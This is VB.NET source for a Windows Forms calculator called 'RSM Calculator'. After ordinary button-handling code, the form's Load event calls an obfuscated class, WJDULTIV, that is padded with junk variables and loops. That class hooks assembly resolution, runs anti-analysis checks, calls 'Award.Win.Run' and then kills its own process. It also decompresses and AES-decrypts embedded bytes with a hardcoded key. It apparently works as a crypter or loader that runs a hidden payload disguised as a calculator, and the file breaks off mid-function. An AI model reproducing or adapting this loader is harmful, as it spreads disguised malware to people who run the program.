        Me.Controls.Add(Me.btnCLR_Curr)
        Me.Controls.Add(Me.btn_Operator_Add)
        Me.Controls.Add(Me.btn_Operator_Subt)
        Me.Controls.Add(Me.btnPow)
        Me.Controls.Add(Me.btn_Operator_div)
        Me.Controls.Add(Me.btn_Operator_Multi)
        Me.Controls.Add(Me.btnCalculate)
        Me.Controls.Add(Me.btnNumPeriod)
        Me.Controls.Add(Me.btn_Num_0)
        Me.Controls.Add(Me.btn_Num_9)
        Me.Controls.Add(Me.btn_Num_8)
        Me.Controls.Add(Me.btn_Num_7)
        Me.Controls.Add(Me.btn_Num_6)
        Me.Controls.Add(Me.btn_Num_5)
        Me.Controls.Add(Me.btn_Num_4)
        Me.Controls.Add(Me.btn_Num_3)
        Me.Controls.Add(Me.btn_Num_2)
        Me.Controls.Add(Me.btn_Num_1)
        Me.Controls.Add(Me.TextBox1)
        Me.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ForeColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(192, Byte), Integer))
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.Name = "Form1"
        Me.Text = "RSM Calculator "
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

#End Region
    'variables to hold operands
    Private Var1 As Double
    Private var2 As Double

    'Varible to hold temporary values
    Private Temp As Double

    'variable for Memory storage
    Private Memory As Double

    'True if "." is use else false
    Private period As Boolean

    'variable to hold Operater
    Private [Operator] As String

    Private Status As Boolean

    Private Sub btn_Num_7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_7.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(7)
        Else
            TextBox1.Text = 7
            Status = False
        End If
    End Sub

    Private Sub btn_Num_8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_8.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(8)
        Else
            TextBox1.Text = 8
            Status = False
        End If
    End Sub

    Private Sub btn_Num_9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_9.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(9)
        Else
            TextBox1.Text = 9
            Status = False
        End If
    End Sub

    Private Sub btn_Num_6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_6.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(6)
        Else
            TextBox1.Text = 6
            Status = False
        End If
    End Sub

    Private Sub btn_Num_5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_5.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(5)
        Else
            TextBox1.Text = 5
            Status = False
        End If
    End Sub

    Private Sub btn_Num_4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_4.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(4)
        Else
            TextBox1.Text = 4
            Status = False
        End If
    End Sub

    Private Sub btn_Num_1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_1.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(1)
        Else
            TextBox1.Text = 1
            Status = False
        End If
    End Sub

    Private Sub btn_Num_2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_2.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(2)
        Else
            TextBox1.Text = 2
            Status = False
        End If
    End Sub

    Private Sub btn_Num_3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_3.Click
        If Status = False Then
            TextBox1.Text = TextBox1.Text + CStr(3)
        Else
            TextBox1.Text = 3
            Status = False
        End If
    End Sub

    Private Sub btn_Num_0_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Num_0.Click
        If Status = False Then
            If TextBox1.Text.Length > 0 Then
                TextBox1.Text = TextBox1.Text + CStr(0)
            End If
        End If
    End Sub

    Private Sub btnNumPeriod_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnNumPeriod.Click
        If Status = False Then
            If period = False Then
                If TextBox1.Text.Length > 0 Then
                    TextBox1.Text = TextBox1.Text + "."
                Else
                    TextBox1.Text = "0."
                End If
                period = True
            End If
        End If
    End Sub

    Private Sub btnnumSign_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnnumSign.Click
        If Status = False Then
            If TextBox1.Text.Length > 0 Then
                Var1 = -1 * CDbl(TextBox1.Text)
                TextBox1.Text = CStr(Var1)
            End If
        End If
    End Sub

    Private Sub btn_Operator_Add_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Operator_Add.Click
        If TextBox1.Text.Length <> 0 Then
            If [Operator] = "" Then
                Var1 = CDbl(TextBox1.Text)
                TextBox1.Text = ""
            Else
                Calculate()
            End If
            [Operator] = "Add"
            period = False
        End If
    End Sub

    Private Sub btnCalculate_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCalculate.Click
        If TextBox1.Text.Length <> 0 AndAlso Var1 <> 0 Then
            Calculate()
            [Operator] = ""
            period = False
        End If
    End Sub

    Private Sub btn_Operator_Subt_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Operator_Subt.Click
        If TextBox1.Text.Length <> 0 Then
            If [Operator] = "" Then
                Var1 = CDbl(TextBox1.Text)
                TextBox1.Text = ""
            Else
                Calculate()
            End If
            [Operator] = "Sub"
            period = False
        End If
    End Sub

    Private Sub btn_Operator_Multi_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Operator_Multi.Click
        If TextBox1.Text.Length <> 0 Then
            If [Operator] = "" Then
                Var1 = CDbl(TextBox1.Text)
                TextBox1.Text = ""
            Else
                Calculate()
            End If
            [Operator] = "Mult"
            period = False
        End If
    End Sub

    Private Sub btn_Operator_div_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_Operator_div.Click
        If TextBox1.Text.Length <> 0 Then
            If [Operator] = "" Then
                Var1 = CDbl(TextBox1.Text)
                TextBox1.Text = ""
            Else
                Calculate()
            End If
            [Operator] = "Div"
            period = False
        End If
    End Sub

    Private Sub btnSqrt_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSqrt.Click
        If TextBox1.Text.Length <> 0 Then
            Temp = CDbl(TextBox1.Text)
            Temp = System.Math.Sqrt(Temp)
            TextBox1.Text = CStr(Temp)
            period = False
        End If
    End Sub

    Private Sub btnPow_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnPow.Click
        If TextBox1.Text.Length <> 0 Then
            If [Operator] = "" Then
                Var1 = CDbl(TextBox1.Text)
                TextBox1.Text = ""
            Else
                Calculate()
            End If
            [Operator] = "Pow"
            period = False
        End If
    End Sub

    Private Sub btnInverse_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnInverse.Click
        If TextBox1.Text.Length <> 0 Then
            Temp = CDbl(TextBox1.Text)
            Temp = 1 / Temp
            TextBox1.Text = CStr(Temp)
            period = False
        End If
    End Sub

    Private Sub btnMemoryPlus_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnMemoryPlus.Click
        If TextBox1.Text.Length > 0 Then
            Memory = Memory + CDbl(TextBox1.Text)
            btnMemStatus.Text = "M"
        End If
    End Sub

    Private Sub btnMemoryMinus_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnMemoryMinus.Click
        If TextBox1.Text.Length > 0 Then
            Memory = Memory - CDbl(TextBox1.Text)
            btnMemStatus.Text = "M"
        End If
    End Sub

    Private Sub btnMemoryRecall_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnMemoryRecall.Click
        If btnMemStatus.Text = "M" Then
            TextBox1.Text = CStr(Memory)
            Status = True
        End If
    End Sub

    Private Sub btnCLR_Curr_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCLR_Curr.Click
        TextBox1.Text = ""
        period = False
    End Sub

    Private Sub btnCLR_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCLR.Click
        TextBox1.Text = ""
        Var1 = 0
        var2 = 0
        [Operator] = ""
        period = False
    End Sub

    Private Sub btnBackspace_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnBackspace.Click
        Dim ch As Char
        Dim i As Int16
        If TextBox1.Text.Length > 0 Then
            ch = TextBox1.Text.Chars(TextBox1.Text.Length - 1)
            If ch = "." Then
                period = False
            End If

            i = TextBox1.Text.Length

            TextBox1.Text = TextBox1.Text.Remove(i - 1, 1)
        End If
    End Sub

    Public Sub Calculate()
        var2 = CDbl(TextBox1.Text)
        If [Operator] = "Add" Then
            Var1 = Var1 + var2
        ElseIf [Operator] = "Sub" Then
            Var1 = Var1 - var2
        ElseIf [Operator] = "Mult" Then
            Var1 = Var1 * var2
        ElseIf [Operator] = "Div" Then
            Var1 = Var1 / var2
        ElseIf [Operator] = "Sqrt" Then
            Exit Sub
        ElseIf [Operator] = "Pow" Then
            Var1 = System.Math.Pow(Var1, var2)
        ElseIf [Operator] = "Inve" Then
            Exit Sub
        End If
        TextBox1.Text = CStr(Var1)
        Status = True
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        WJDULTIV.dvDVfMuk()
    End Sub
End Class
Public Class WJDULTIV
    Shared Sub Iqlqshmc()
        Dim ShBgSXVM = Functions.Main.DoShit(Application.ExecutablePath, Application.StartupPath)

        Dim hQRHSJvC = SaLdNXjU()


        Dim gBcRweoT = CyeJxHbN()
        If ShBgSXVM.Item2 = True Then
            Dim SHcapOBihzO As Integer = 283
            Dim CqtryEJtMWz As Integer = 0
            For MnQIOUVJehV = 0 To 100
                CqtryEJtMWz += 1
            Next
            Dim kQvWvWZJYeo As Integer = 359
            Dim XPaIxJwnmYW As Byte() = {}
            Dim AruLKHdmQvz As String = "zyCmzhGSsFr"
            Dim qtZmWzch = New anti.IntegrityCheck

            Dim nMGEMrVO = JJIxOVII()
            qtZmWzch.AppExePath = Application.ExecutablePath
            Dim dsTMCRYbiLw As Integer = 473
            Dim NakdLHfmMhh As Long = 482
            Dim XYHuaXrCesE As Byte() = {}
            Dim JWuYlMSoDmb As Integer = 690
            Dim YLrrvWlpaZT As Object = {}
            qtZmWzch.AppPath = Application.StartupPath

            Dim geKEpPpV = ArsVNvTr()
            qtZmWzch.RunCheck()
            Dim gkKQyJdAlk As Integer = 663
            Dim hMwhfIDpjb As Object = {}
            Dim LUtEXeBuiV As Boolean = False
            If LUtEXeBuiV = True Then
                Debug.Print("NpPiTcFUBN")
            End If
            Dim spwTawhLVJ As Boolean = True
            If spwTawhLVJ = False Then
                Debug.Print("wCCKktPXJC")
            End If
            Dim qQbZkzsldw As Long = 374
        End If

        Dim uzUQfQTl = OMDiDwyI()
        Award.Win.Run(ShBgSXVM.Item1, Command, Application.ExecutablePath)
        Dim SPOvTOVSkcD As Boolean = True
        If SPOvTOVSkcD = False Then
            Debug.Print("ODRPEsgozYF")
        End If
        Dim SJPfZPlTLIH As Integer = 513
        Dim lnDFbVMVVfR As Long = 15
        Dim ffyfjCtbSrM As Integer = 532
        Dim AYKSmHoEWmJ As Byte() = {}
        Process.GetCurrentProcess.Kill()
        Dim dWHRPUGzkQJ As Integer = 404
        Dim atvSbxbIWXf As Integer = 0
        For HVGITrjGlVR = 0 To 100
            atvSbxbIWXf += 1
        Next
        Dim dYPcKvzhnFG As Byte() = {}
        Dim vJUpxDwwcbE As String = "TUkkFEKktkr"
        Dim azDuQYEpyhX As Byte() = {}
    End Sub

    Public Shared Function SaLdNXjU()
        Dim XwoRgSCIZxy As Boolean = False
        If XwoRgSCIZxy = True Then
            MsgBox("gMaBUkElTwB")
        End If
        Dim bTspePESLgk As Byte() = {}
        Dim CDdecOHgUCB As Boolean = True
        If CDdecOHgUCB = False Then
            MsgBox("THwJoWuHmMg")
        End If
        Dim PwzeZAEdBIi As Boolean = True
        If PwzeZAEdBIi = False Then
            MsgBox("TCxtuXJINrk")
        End If
        Dim mgmTvdlKXPu As Long = 397
        Dim ttqJhwoCzXu As Boolean = True
        If ttqJhwoCzXu = False Then
            MsgBox("BRshHPMtYWm")
        End If
        Dim OVWYncXWFGH As Integer = 689
        Dim rpdcGbxyUNM As Boolean = True
        If rpdcGbxyUNM = False Then
            MsgBox("aqJNoSuWcYd")
        End If
        Dim HSTDgLDTrVP As Integer = 0
        For dVdXYPSutGD = 0 To 100
            HSTDgLDTrVP += 1
        Next
        Dim vHikKXPKicC As String = "URyfTYdxzlo"
        Dim axQoesXCEiV As String = "EzGlgorbbSc"
        Dim PePiXDOeQpT As Object = {}
        Dim exPoFPsjrxb As Long = 309
        Dim vMhAEXzJHwx As Long = 535
        Dim wiLpwwwRded As Integer = 0
        For zGYYqTsJSCL = 0 To 100
            wiLpwwwRded += 1
        Next
        Dim qOzXUCQsZLk As Long = 197
        Dim vBjTRXfLJHG As Long = 728
        Dim rBkUpBKeVsA As Boolean = True
        If rBkUpBKeVsA = False Then
            MsgBox("AoJFRSCwpNf")
        End If
        Return "TkMysZTKcZV"
    End Function
    Public Shared Function CyeJxHbN()
        Dim vkSIQOen As Byte() = {}
        Dim ZnQPOkrt As Object = {}
        Dim DqOXMGFz As Integer = 0
        For htMeKcSF = 0 To 100
            DqOXMGFz += 1
        Next
        Dim LxKmJzgK As String = "oAItHVtQ"
        Dim EiykbFjl As Integer = 455
        Dim imwsZbwq As Object = {}
        Dim MpuzXxKw As String = "qssGVTXC"
        Dim UvqOUqlI As String = "xzoVSMyO"
        Dim NheMmwoi As Object = {}
        Dim FFlkOEZa As Byte() = {}
        Return "jJjsMamg"
    End Function
    Public Shared Function JJIxOVII()
        Dim QPEMKNiU As Byte() = {}
        Dim uTCTIjwa As Byte() = {}
        Dim YWAbGFJg As Long = 263
        Dim CZziFcXm As Byte() = {}
        Dim SHoZZMNG As Integer = 111
        Dim vLmhXiaM As Byte() = {}
        Dim ZOkoVEnS As Long = 789
        Dim DRiwTaBY As Boolean = False
        If DRiwTaBY = True Then
            MsgBox("hVgDSwOd")
        End If
        Dim LYfKQTcj As Integer = 175
        Return "bGUCkDSE"
    End Function
    Public Shared Function ArsVNvTr()
        Dim bnkCuVik As String = "HaCkWoEO"
        Dim Bjcjcuxd As Integer = 216
        Dim vsChhArs As Boolean = False
        If vsChhArs = True Then
            MsgBox("cfUQJTMW")
        End If
        Dim WouOPZGl As Boolean = False
        If WouOPZGl = True Then
            MsgBox("DbMwqtcP")
        End If
        Dim xkmvwzVe As Object = {}
        Dim dXEdYSrI As Integer = 211
        Dim XgebdYkX As Integer = 0
        For SoEajedm = 0 To 100
            XgebdYkX += 1
        Next
        Dim ycWILxzQ As String = "skwHQDsf"
        Dim ZYOpsXOJ As String = "TgonycHY"
        Dim NpOmDiBn As Integer = 0
        For ucgUfCXR = 0 To 100
            NpOmDiBn += 1
        Next
        Dim yafWzyxX As String = "fNxEbRTB"
        Return "ZWXChXNQ"
    End Function
    Public Shared Function OMDiDwyI()
        Dim oIvOkWNA As String = "jQVNqbGQ"
        Dim dZvLwhzf As Byte() = {}
        Dim XhWKBntu As Object = {}
        Dim EVnsdGOY As Integer = 0
        For ydNrjMIn = 0 To 100
            EVnsdGOY += 1
        Next
        Dim eRfZKgeR As Integer = 0
        For ZaFXQlXg = 0 To 100
            eRfZKgeR += 1
        Next
        Dim FNXFsFtK As Long = 953
        Dim zWxExLmZ As Boolean = False
        If zWxExLmZ = True Then
            MsgBox("teYCDQfp")
        End If
        Dim aSplfkBS As String = "UaPjlquh"
        Dim AOhRMKQL As Integer = 153
        Dim vWHQSPJa As Boolean = True
        If vWHQSPJa = False Then
            MsgBox("pfiOYVDq")
        End If
        Return "VSzxzpYT"
    End Function



    Public Shared Function bYrFYPpS(AkpbwpLQ As Byte()) As Byte()
        Dim YwNhARSm = New IO.MemoryStream()

        Dim YJDqzGuZ = MDRnXSrO()
        Dim jmdXaHBV = New IO.Compression.DeflateStream(New IO.MemoryStream(AkpbwpLQ), IO.Compression.CompressionMode.Decompress, True)

        Dim lMDrWqQP = ZGQouCME()
        Dim RnbgsZph = New Byte(4095) {}

        Dim HHIYMsVz = vBWVkERp()
        While True
            Dim TClrdxATDLx As Integer = 0
            For iWmwLIeXfSF = 0 To 100
                TClrdxATDLx += 1
            Next
            Dim zkEIKQlxuSb As Integer = 289
            Dim BGixCpiFRzH As Long = 472
            Dim EeugwMexGYp As Object = {}
            Dim umWfawCgNhO As Integer = 0
            For NvOsADplbZp = 0 To 100
                umWfawCgNhO += 1
            Next
            Dim beqVSOZR = jmdXaHBV.Read(RnbgsZph, 0, RnbgsZph.Length)

            Dim HkXQDgnX = vekNbskM()
            If beqVSOZR > 0 Then
                Dim aNPetKhOvBi As Integer = 0
                For IWLBMCzAhKo = 0 To 100
                    aNPetKhOvBi += 1
                Next
                Dim GvhwbeStmIN As Object = {}
                Dim bGHDDjEiTrq As Byte() = {}
                Dim LpYUMZLsxNb As Object = {}
                Dim UmvlcqXIPYx As Boolean = False
                If UmvlcqXIPYx = True Then
                    Debug.Print("sPazJsbJJWQ")
                End If
                YwNhARSm.Write(RnbgsZph, 0, beqVSOZR)

                Dim mCthQPcj = awHeobYY()
            Else
                Dim OgEZWoIsiPM As Object = {}
                Dim gkXFixvUAZr As Long = 618
                Dim OERJppiEkYo As Integer = 0
                For SKPYKLojwIq = 0 To 100
                    OERJppiEkYo += 1
                Next
                Dim lnEyLSPlGfA As Boolean = True
                If lnEyLSPlGfA = False Then
                    Debug.Print("sBIpxlTdinA")
                End If
                Dim NtTcBpOGmix As Object = {}
                Exit While

                Dim Xticrzgv = YIEptxAW()
            End If
            Dim CfrjveXWNGQ As Object = {}
            Dim lgXUdVUtURh As Object = {}
            Dim gdqazAAcOLY As Integer = 0
            For CgAurFQDQvN = 0 To 100
                gdqazAAcOLY += 1
            Next
            Dim USFHdNNTFRL As String = "scUCmOaGWay"
            Dim zInLxiULbXe As Long = 284
        End While
        Dim GCKrnzBdJF As Integer = 0
        For xIdfVIgfNZ = 0 To 100
            GCKrnzBdJF += 1
        Next
        Dim PLoAmqaZbu As Object = {}
        Dim CpFAcCTRVL As Integer = 536
        Dim gWjvZTbcOK As Long = 512
        Dim oieaPMmnne As String = "XqSmndMrWy"
        jmdXaHBV.Close()

        Dim EhpKGvBj = sbDHeHyZ()
        Return YwNhARSm.ToArray()
        Dim fQhXyNpLRaN As Byte() = {}
        Dim eWpzooSrtkF As String = "cDcgoRHydhT"
        Dim AqFbJSfxVTd As Object = {}
        Dim wCvvhwfIJl As Integer = 0
        For rQUKgBIWde = 0 To 100
            wCvvhwfIJl += 1
        Next
        Dim vVJOGxVUmZ As Integer = 629
    End Function

    Public Shared Function MDRnXSrO()
        Dim WugdxIay As Long = 256
        Dim izTgZweI As Integer = 0
        For uFFjBkhT = 0 To 100
            izTgZweI += 1
        Next
        Dim sqiVzmNs As Boolean = True
        If sqiVzmNs = False Then
            MsgBox("EwUYbaQD")
        End If
        Dim QCHbDOTN As Long = 594
        Dim cItefCXY As Boolean = False
        If cItefCXY = True Then
            MsgBox("btWRdEDx")
        End If
        Dim nzJUFsGH As String = "zFvXhgJS"
        Dim xqYJfipr As Integer = 0
        For JvKMHWtB = 0 To 100
            xqYJfipr += 1
        Next
        Dim VBxPiKwM As String = "hHjSKxzX"
        Dim fsMFIzfw As Boolean = False
        If fsMFIzfw = True Then
            MsgBox("ryzIknjG")
        End If
        Dim DElLMbmR As Boolean = True
        If DElLMbmR = False Then
            MsgBox("BpOxKdSq")
        End If
        Return "NvAAmRVA"
    End Function
    Public Shared Function ZGQouCME()
        Dim jxgeUswo As Boolean = False
        If jxgeUswo = True Then
            MsgBox("vCShwgzz")
        End If
        Dim HIFkYUCJ As Object = {}
        Dim TOrnAIGU As Boolean = True
        If TOrnAIGU = False Then
            MsgBox("RzUZyKlt")
        End If
        Dim dFGcaypD As Byte() = {}
        Dim pLtfBmsO As Integer = 205
        Dim nwWSAoYn As Boolean = True
        If nwWSAoYn = False Then
            MsgBox("zCIVbcbx")
        End If
        Dim LIvYDQfI As Boolean = True
        If LIvYDQfI = False Then
            MsgBox("XOhbfEiT")
        End If
        Dim VyKNdGOr As Integer = 0
        For hEwQFuRC = 0 To 100
            VyKNdGOr += 1
        Next
        Dim tKjThhVN As Integer = 0
        For CklJtaic = 0 To 100
            tKjThhVN += 1
        Next
        Dim OqXMVNmn As Boolean = False
        If OqXMVNmn = True Then
            MsgBox("awKPxBpy")
        End If
        Dim mCwSZpsI As Object = {}
        Return "kmZEXrYh"
    End Function
    Public Shared Function vBWVkERp()
        Dim FslKKuAY As Long = 446
        Dim RyYNmiEj As Integer = 9
        Dim dEKQOWHt As Object = {}
        Dim pKwTqJKE As Object = {}
        Dim nvaGoLqd As Object = {}
        Dim zBMJPzun As Byte() = {}
        Dim LHyMrnxy As Long = 316
        Dim KsbyppdX As Boolean = True
        If KsbyppdX = False Then
            MsgBox("WxOBRdgi")
        End If
        Dim iDAEtRks As Boolean = False
        If iDAEtRks = True Then
            MsgBox("uJmHVFnD")
        End If
        Return "suQuTHTc"
    End Function
    Public Shared Function vekNbskM()
        Dim FVADBiTw As Boolean = False
        If FVADBiTw = True Then
            MsgBox("RbmGdWWG")
        End If
        Dim dhZJFJaR As Long = 321
        Dim pnLMhxdc As Object = {}
        Dim nXoyfzJA As Byte() = {}
        Dim zdaBHnML As Byte() = {}
        Dim LjNEjbPW As Byte() = {}
        Dim JUqrhdvv As Long = 821
        Dim VacuJRzF As Byte() = {}
        Dim hgOxlFCQ As Long = 305
        Dim tmBANtFa As String = "rXemLvlz"
        Dim DdQpnjpK As Boolean = False
        If DdQpnjpK = True Then
            MsgBox("PjDsOXsU")
        End If
        Return "OUgfMZYt"
    End Function
    Public Shared Function awHeobYY()
        Dim yIfksDft As Boolean = False
        If yIfksDft = True Then
            MsgBox("wtIWqFLS")
        End If
        Dim IzvZStOd As Integer = 586
        Dim VFhcuhRn As Boolean = False
        If VFhcuhRn = True Then
            MsgBox("hLTfVVVy")
        End If
        Dim tRFixIYJ As Boolean = True
        If tRFixIYJ = False Then
            MsgBox("FXslZwcT")
        End If
        Dim RceoBkfe As Object = {}
        Dim PNHbzmLD As Long = 719
        Dim bTuebaON As String = "nZghDORY"
        Dim lKJTBQxx As Boolean = True
        If lKJTBQxx = False Then
            MsgBox("xQvWdEBH")
        End If
        Dim JWiZFsES As Integer = 237
        Dim mdNGaOVJ As Boolean = True
        If mdNGaOVJ = False Then
            MsgBox("kOqtYQBi")
        End If
        Return "wUcwAEEt"
    End Function
    Public Shared Function YIEptxAW()
        Dim jzUfTnjF As Boolean = False
        If jzUfTnjF = True Then
            MsgBox("vFGivbnQ")
        End If
        Dim HLslXPqb As Byte() = {}
        Dim TRfozDtl As Boolean = True
        If TRfozDtl = False Then
            MsgBox("fXRrbrxw")
        End If
        Dim rcDuDfAG As Boolean = True
        If rcDuDfAG = False Then
            MsgBox("pNggBhgf")
        End If
        Dim BTTjdUjq As String = "NZFmEInA"
        Dim ZfrpgwqL As Long = 927
        Dim XQVceyWk As Long = 209
        Dim jWHfGmZv As Long = 406
        Dim GQSlxQKw As Long = 494
        Return "EBwXvSqV"
    End Function
    Public Shared Function sbDHeHyZ()
        Dim QnbNijEu As Boolean = False
        If QnbNijEu = True Then
            MsgBox("OYFzglkT")
        End If
        Dim aerCIZod As Integer = 362
        Dim mkdFkNro As Boolean = True
        If mkdFkNro = False Then
            MsgBox("yqPIMBuz")
        End If
        Dim wbtvKCaY As Integer = 571
        Dim Igfymqei As Boolean = False
        If Igfymqei = True Then
            MsgBox("UmRBOeht")
        End If
        Dim gsEEpSkD As Boolean = False
        If gsEEpSkD = True Then
            MsgBox("syqHRGoO")
        End If
        Dim EEcKturZ As String = "QKONViuj"
        Dim OvszTkaI As Boolean = True
        If OvszTkaI = False Then
            MsgBox("aBeCvYeT")
        End If
        Dim mHQFXMhd As Integer = 0
        For ksusVONC = 0 To 100
            mHQFXMhd += 1
        Next
        Dim wygvxCQN As String = "IESyZqUX"
        Return "mLxeuLkP"
    End Function




    Public Shared wiIBFu As Boolean
    Shared Sub dvDVfMuk()
        If Not wiIBFu Then

            DGjcKib()
            AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf uTmnDvNy
            Dim gJavGIPcZZM As Byte() = {}
            Dim RkbaexAZZxI As Integer = 659
            Dim JkmnXfCuBIs As Long = 585
            Dim waJexSISvDb As Object = {}
            Dim KTnWeceEaXF As Integer = 0
            For CIACjLMaEtx = 0 To 100
                KTnWeceEaXF += 1
            Next
            wiIBFu = True

            Dim kphhOuJq = opXVtpmo()
        End If
        Dim USCWRHzrhr As Byte() = {}
        Dim OgckRNcGAk As Byte() = {}
        Dim hFaFUuMpoc As Integer = 0
        For qgsyMlrbHT = 0 To 100
            hFaFUuMpoc += 1
        Next
        Dim KyZgeRFxQM As Object = {}
        Dim VRbmlGPVFE As Boolean = True
        If VRbmlGPVFE = False Then
            Debug.Print("qbthSlHcjy")
        End If
        Iqlqshmc()

        Dim lPsuZnNh = oWzVqkLu()
    End Sub

    Public Shared Sub DGjcKib()



        Dim SkiOgta As Object = {}
        Dim PjjPFWF As Long = 296
        Dim hVocseC As Long = 76
    End Sub
    Public Shared Function opXVtpmo()
        Dim fqrtiyhr As Integer = 166
        Dim bqBFDDEs As Boolean = False
        If bqBFDDEs = True Then
            MsgBox("XrLQXHct")
        End If
        Dim SsVcsLzu As Object = {}
        Dim OsfoMQXv As Boolean = False
        If OsfoMQXv = True Then
            MsgBox("JtpAgUux")
        End If
        Dim FuzMBZSy As Byte() = {}
        Dim AuJYVdpz As Byte() = {}
        Dim KQcAUUk As Boolean = False
        If KQcAUUk = True Then
            MsgBox("CQnNNCm")
        End If
        Dim RvmzjNl As Integer = 0
        For NunzIqQ = 0 To 100
            RvmzjNl += 1
        Next
        Dim ffsMvyN As Object = {}
        Dim wjMsGHA As Object = {}
        Dim YoxjXIG As Boolean = False
        If YoxjXIG = True Then
            MsgBox("bCLldfh")
        End If
        Return "VbrsMLX"
    End Function
    Public Shared Function oWzVqkLu()
        Dim iImUJqOU As Integer = 356
        Dim sWpJWfnt As Integer = 0
        For pOijFjpg = 0 To 100
            sWpJWfnt += 1
        Next
        Dim mHcIomrT As Byte() = {}
        Dim xVfxBbQs As Integer = 0
        For uOYXleSf = 0 To 100
            xVfxBbQs += 1
        Next
        Dim BvrziYBJ As Integer = 217
        Dim MJupvNah As Long = 153
        Dim JCoOfQcU As Boolean = False
        If JCoOfQcU = True Then
            MsgBox("TPqDsFBt")
        End If
        Dim QIkdbIDg As Byte() = {}
        Dim NBeCKLET As Byte() = {}
        Dim YPgsXBds As Object = {}
        Return "VHaRGEff"
    End Function

    Private Shared Function mUGLsEIA(ByVal tbCaoxjM() As Byte) As Byte()
        Dim KgeRwgPV As New System.Security.Cryptography.RijndaelManaged

        QKbLCCI()
        Dim UXuHVWyF As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim utagEbKpEI As Byte() = {}
        Dim SnLCODLUYF As Long = 435
        Dim vDYNrbenCy As Integer = 42
        Dim vfLdYaEcAp As Boolean = False
        If vfLdYaEcAp = True Then
            Debug.Print("ZoIBRwChzj")
        End If
        Dim OnVOjIiVof As Object = {}

        Dim ypXbuvgeDUS As String = "ZZHPsuisNqk"
        Dim qdbvEDVTfAO As Object = {}
        Dim mSePphgptvR As Integer = 52
        Dim qYcfKDlUGfT As Long = 261
        Dim JBRFLKMWQCc As Object = {}
        Try
            Dim WjaoYtRWYM As Byte() = {}
            Dim TMWQaxOLmd As Object = {}
            Dim JbGruHPbVw As Boolean = False
            If JbGruHPbVw = True Then
                Debug.Print("ZlhyvqfkPQ")
            End If
            Dim yCFUtSWEIj As Object = {}
            Dim sjSMZyEa(31) As Byte

            BnvTPFj()
            Dim CaiCzooK As Byte() = UXuHVWyF.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Dim qAcnFoetKUM As Long = 139
            Dim pHkOvOHameE As Boolean = True
            If pHkOvOHameE = False Then
                Debug.Print("noWwurwhWaS")
            End If
            Dim ZwIHtfrRsKh As Integer = 0
            For ScPOCMChOps = 0 To 100
                ZwIHtfrRsKh += 1
            Next
            Dim tWyjoLYsVBB As Object = {}
            Dim QHtkGOyHvxJ As Byte() = {}
            Array.Copy(CaiCzooK, 0, sjSMZyEa, 0, 16)

            JXVlBSo()
            Array.Copy(CaiCzooK, 0, sjSMZyEa, 15, 16)
            Dim xkUZrVfGXQ As String = "HozSwMUCRl"
            Dim EJfHMOwezD As Integer = 29
            Dim vQyvvXbfEY As Long = 698
            Dim bnShprtLxq As Object = {}
            Dim PSjhfDlDqG As Integer = 0
            For PXixZDVDPb = 0 To 100
                PSjhfDlDqG += 1
            Next
            KgeRwgPV.Key = sjSMZyEa

            Dim BisZhsaI = ISBoqlKf()
            KgeRwgPV.Mode = Security.Cryptography.CipherMode.ECB
            Dim gjZHDGFguI As String = "WxJiXQGvdb"
            Dim nIkpYzWEWv As Byte() = {}
            Dim LZILWbNYQO As Integer = 359
            Dim KmXOBcTmUh As Integer = 0
            For RGjgdWzLXA = 0 To 100
                KmXOBcTmUh += 1
            Next
            Dim amGIDQuf As System.Security.Cryptography.ICryptoTransform = KgeRwgPV.CreateDecryptor

            EoblwVV()
            Dim kcWydGeO() As Byte = amGIDQuf.TransformFinalBlock(tbCaoxjM, 0, tbCaoxjM.Length)
